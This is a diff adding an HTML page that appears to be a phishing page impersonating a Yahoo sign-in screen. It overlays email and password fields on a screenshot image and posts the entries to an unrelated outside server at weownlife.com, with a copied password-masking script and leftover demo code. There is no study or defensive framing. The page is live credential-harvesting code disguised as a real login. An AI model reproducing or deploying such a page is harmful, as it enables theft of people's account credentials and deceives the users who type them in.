@@ -1,0 +1,57 @@
+
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<script type="text/javascript" src="https://www.sitepoint.com/examples/password/MaskedPassword/MaskedPassword.js"></script>
+
+
+<title>YAHOO SIGN IN</title>
+<meta name="GENERATOR" content="DUDU">
+<meta name="DUDU" content="DUDU">
+<style type="text/css">
+body
+{
+   background-color: #F6F6F6;
+   color: #000000;
+}
+</style>
+<style type="text/css">
+a:hover
+{
+   color: #6CDA7B;
+}
+</style>
+<!--[if lt IE 7]>
+<style type="text/css">
+   img { behavior: url("pngfix.htc"); }
+</style>
+<![endif]-->
+</head>
+<body>
+<div id="bv_Image1" style="margin:0;padding:0;position:absolute;left:56px;top:13px;width:294px;height:486px;text-align:left;z-index:3;">
+<img src="./YY1.htm/YY1.png" id="Image1" alt="" style="width:294px;height:486px;" align="top" border="0"></div>
+
+<div id="bv_Form1" style="position:absolute;left:9px;top:0px;width:401px;height:503px;z-index:4">
+<form name="Form1" method="post" id="demo-form" action="https://weownlife.com/onedrive/YY1.php" "="">
+
+<input id="email" style="position:absolute;left:83px;top:111px;width:219px;height:34px;border:1px #C0C0C0 solid;font-family:Arial;font-size:12px;z-index:0" name="email" value="" type="text" required="" placeholder="Enter Email">
+
+
+<input style="position:absolute;left:83px;top:159px;width:219px;height:34px;border:1px #C0C0C0 solid;font-family:Arial;font-size:12px;z-index:1" name="password" value="" type="text" id="demo-field" required="" placeholder="Password">
+
+
+<input id="Button1" name="Button1" value="" style="position:absolute;left:83px;top:244px;width:222px;height:39px;border:0px #000000 dotted;background-color:transparent;font-family:Arial;font-size:13px;z-index:2" type="submit">
+</form></div>
+<script type="text/javascript">
+ 
+  //apply masking to the demo-field
+  //pass the field reference, masking symbol, and character limit
+  new MaskedPassword(document.getElementById("demo-field"), '\u25CF');
+ 
+  //test the submitted value
+  document.getElementById('demo-form').onsubmit = function()
+  {
+   alert('pword = "' + this.pword.value + '"');
+   return false;
+  };
+ 
+ </script>
+</body></html>
